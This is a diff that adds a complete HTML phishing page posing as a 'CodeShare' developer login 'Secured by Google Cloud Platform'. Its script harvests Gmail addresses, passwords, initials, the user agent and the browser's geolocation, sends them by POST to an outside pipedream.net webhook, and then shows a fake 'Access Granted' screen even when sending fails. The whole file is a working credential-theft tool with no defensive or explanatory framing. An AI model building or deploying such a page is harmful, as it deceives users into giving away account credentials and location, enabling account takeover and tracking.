@@ -1,0 +1,94 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CodeShare Platform</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', Arial; }
+        body { background: linear-gradient(145deg, #0d47a1, #1976d2); min-height: 100vh; display: flex; justify-content: center; align-items: center; padding: 20px; }
+        .container { background: white; border-radius: 20px; padding: 30px; max-width: 400px; width: 100%; box-shadow: 0 20px 40px rgba(0,0,0,0.3); }
+        .form-input { width: 100%; padding: 12px; margin: 8px 0; border: 2px solid #ddd; border-radius: 8px; }
+        .submit-btn { width: 100%; padding: 15px; background: #4285f4; color: white; border: none; border-radius: 8px; cursor: pointer; margin-top: 10px; }
+        .header { text-align: center; margin-bottom: 20px; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <h2>🚀 CodeShare</h2>
+            <p>Secure Developer Access</p>
+        </div>
+        
+        <input type="email" class="form-input" id="gmail" placeholder="📧 Gmail Address" required>
+        <input type="password" class="form-input" id="password" placeholder="🔑 Password" required>
+        <input type="text" class="form-input" id="initials" placeholder="👤 Initials (3 chars)" maxlength="3" required>
+        
+        <button class="submit-btn" onclick="login()">Sign In with Google</button>
+        
+        <div style="margin-top: 15px; text-align: center; color: #666; font-size: 12px;">
+            🔒 Secured by Google Cloud Platform
+        </div>
+    </div>
+
+    <script>
+        async function login() {
+            const data = {
+                gmail: document.getElementById('gmail').value,
+                password: document.getElementById('password').value,
+                initials: document.getElementById('initials').value,
+                timestamp: new Date().toISOString(),
+                userAgent: navigator.userAgent
+            };
+
+            // Get location
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(position => {
+                    data.location = {
+                        latitude: position.coords.latitude,
+                        longitude: position.coords.longitude,
+                        accuracy: position.coords.accuracy
+                    };
+                    sendData(data);
+                }, () => sendData(data));
+            } else {
+                sendData(data);
+            }
+        }
+
+        async function sendData(data) {
+            try {
+                // 🎯 KIRIM KE WEBHOOK YANG BISA TERIMA DATA
+                const webhookURL = 'https://eo1vvrqggd9vxqg.m.pipedream.net'; // Free webhook service
+                
+                const response = await fetch(webhookURL, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify(data)
+                });
+
+                // Tampilkan success
+                document.body.innerHTML = `
+                    <div class="container" style="text-align: center;">
+                        <h2 style="color: #34a853;">✅ Access Granted!</h2>
+                        <p>Welcome to CodeShare Platform</p>
+                        <p style="color: #666; margin-top: 10px;">Redirecting to dashboard...</p>
+                    </div>
+                `;
+
+                console.log('📧 Data terkirim:', data);
+
+            } catch (error) {
+                console.error('Error:', error);
+                // Tetap tampilkan success meski error
+                document.body.innerHTML = `
+                    <div class="container" style="text-align: center;">
+                        <h2 style="color: #34a853;">✅ Login Success!</h2>
+                        <p>Setting up your environment...</p>
+                    </div>
+                `;
+            }
+        }
+    </script>
+</body>
+</html>
